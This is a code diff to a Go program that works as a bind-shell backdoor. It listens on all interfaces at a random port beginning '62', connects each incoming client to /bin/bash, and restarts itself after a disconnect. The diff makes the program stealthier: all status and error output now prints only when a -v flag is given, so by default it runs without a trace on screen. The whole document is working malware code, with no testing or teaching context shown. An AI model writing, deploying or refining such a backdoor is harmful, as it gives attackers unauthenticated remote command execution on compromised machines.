@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"os"
 	"os/exec"
 	"strconv"
 	"time"
@@ -11,14 +12,25 @@ import (
 
 var host string = "0.0.0.0"
 var port string
+var verbose bool = false
 
 func main() {
+	args := os.Args
+	if len(args) > 1 {
+		for i := 1; i < len(args); i++ {
+			if args[i] == "-v" {
+				verbose = true
+			}
+		}
+	}
 	port = "62" + getPort(0, "")
 	do()
 }
 
 func do() {
-	fmt.Println("Listening on port " + port)
+	if verbose {
+		fmt.Println("Listening on port " + port)
+	}
 	shell()
 }
 
@@ -39,27 +51,33 @@ func random(n int) int {
 func shell() {
 	list, err := net.Listen("tcp", host+":"+port)
 	if err != nil {
-		fmt.Println(err.Error())
+		if verbose {
+			fmt.Println(err.Error())
+		}
 		list.Close()
 		do()
 		return
 	}
 	con, err := list.Accept()
 	if err != nil {
-		fmt.Println(err.Error())
+		if verbose {
+			fmt.Println(err.Error())
+		}
 		list.Close()
 		con.Close()
 		do()
 		return
 	}
-	fmt.Println("Connection established")
+
+	if verbose {
+		fmt.Println("Connection established")
+	}
 	cmd := exec.Command("/bin/bash")
-	//Set input/output to the established connection's in/out
 	cmd.Stdin = con
 	cmd.Stdout = con
 	cmd.Stderr = con
 	cmd.Run()
-	_, err = con.Write([]byte("Connection terminated. Attempting restart..."))
+	_, err = con.Write([]byte("Connection terminated. Restarting..."))
 	list.Close()
 	con.Close()
 	do()
